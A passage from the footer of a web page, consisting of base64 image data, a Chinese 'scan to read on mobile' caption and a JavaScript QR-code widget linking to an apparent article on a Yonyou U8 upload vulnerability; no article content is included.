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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-u8-sendfile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 